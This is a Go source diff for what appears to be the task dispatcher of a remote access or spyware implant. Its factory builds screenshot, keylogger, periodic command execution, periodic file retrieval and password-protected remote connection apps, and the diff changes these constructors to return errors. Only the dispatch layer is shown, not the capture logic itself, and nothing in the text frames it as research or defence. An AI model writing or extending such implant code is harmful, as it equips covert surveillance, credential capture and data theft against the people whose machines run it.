@@ -28,7 +28,7 @@ type AppData struct {
 type App interface {
 	Start(wg *sync.WaitGroup)
 	Stop()
-	Validate() error
+	validateParams() error
 }
 
 var lgr = logger.GetLogger()
@@ -46,19 +46,24 @@ func NewAppFactory(appData AppData) (App, error) {
 		// TODO: change config on demand
 		break
 	case ScreenShotTask:
-		app = NewScreenshotApp(
+		app, err = NewScreenshotApp(
 			appParams["Interval"].(int),
 			appParams["Quality"].(int),
 		)
 		break
 	case KeyLoggerTask:
-		app = NewKeyLoggerApp()
+		app, err = NewKeyLoggerApp()
 		break
 	case CommandTask:
-		app, err = newApp[PeriodicCommandApp](appData.Params)
+		app, err = NewPeriodicCommandApp(
+			appParams["Command"].(string),
+			appParams["Interval"].(int),
+			appParams["Timeout"].(int),
+			appParams["MaxRuns"].(int),
+		)
 		break
 	case GetFileTask:
-		app = NewPeriodicGetFileApp(
+		app, err = NewPeriodicGetFileApp(
 			appParams["Path"].(string),
 			appParams["MaxSize"].(int),
 			appParams["Interval"].(int),
@@ -67,24 +72,14 @@ func NewAppFactory(appData AppData) (App, error) {
 		)
 		break
 	case ConnectOnlineTask:
-		app, err = newApp[ConnectOnlineApp](appData.Params)
+		app, err = NewConnectOnlineApp(
+			appParams["Port"].(int),
+			appParams["Password"].(string),
+		)
 		break
 	default:
 		err = errors.New("unknown app type")
 	}
-	if err != nil {
-		return nil, err
-	}
-	if app == nil {
-		return nil, errors.New("app: app not found")
-	}
-	return app, nil
-}
 
-func newApp[T any](raw json.RawMessage) (*T, error) {
-	var app T
-	if err := json.Unmarshal(raw, &app); err != nil {
-		return nil, err
-	}
-	return &app, nil
+	return app, err
 }
